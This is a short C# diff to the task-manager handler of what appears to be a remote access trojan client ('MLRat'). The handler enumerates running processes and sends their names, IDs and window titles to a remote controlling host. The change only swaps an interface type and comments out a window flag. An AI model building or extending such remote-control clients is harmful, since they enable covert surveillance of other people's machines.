@@ -1,5 +1,4 @@
 ﻿using MLRat.Client;
-using SharedCode.CustomObjects;
 using SharedCode.Network;
 using System;
 using System.Collections.Generic;
@@ -11,8 +10,8 @@ namespace MLManagementClient.Handlers
 {
     public static class TaskManagerHandler
     {
-        static IClientConnection NetworkHost = null;
-        public static void SetNetworkHost(IClientConnection connection)
+        static IClientHost NetworkHost = null;
+        public static void SetNetworkHost(IClientHost connection)
         {
             NetworkHost = connection;
         }
@@ -32,7 +31,8 @@ namespace MLManagementClient.Handlers
             string[] ProcessNames = new string[allProcs.Length];
             int[] procIds = new int[allProcs.Length];
             string[] windowText = new string[allProcs.Length];
-            bool[] hasWindow = new bool[allProcs.Length];
+            //bool[] hasWindow = new bool[allProcs.Length];
+
             for(int i = 0; i < allProcs.Length; i++)
             {
                 try
@@ -40,7 +40,7 @@ namespace MLManagementClient.Handlers
                     ProcessNames[i] = allProcs[i].ProcessName;
                     procIds[i] = allProcs[i].Id;
                     windowText[i] = allProcs[i].MainWindowTitle;
-                    hasWindow[i] = allProcs[i].MainWindowTitle != string.Empty;
+                    //hasWindow[i] = allProcs[i].MainWindowTitle != string.Empty;
                 }
                 catch
                 {
@@ -49,7 +49,7 @@ namespace MLManagementClient.Handlers
                     windowText[i] = "Access denied";
                 }
             }
-            NetworkHost.Send((byte)NetworkCommand.TaskManager, (byte)TaskManagerCommand.ProcessList, ProcessNames, procIds, windowText, hasWindow, currentProc.Id);
+            NetworkHost.Send((byte)NetworkCommand.TaskManager, (byte)TaskManagerCommand.ProcessList, ProcessNames, procIds, windowText, currentProc.Id);
         }
     }
 }
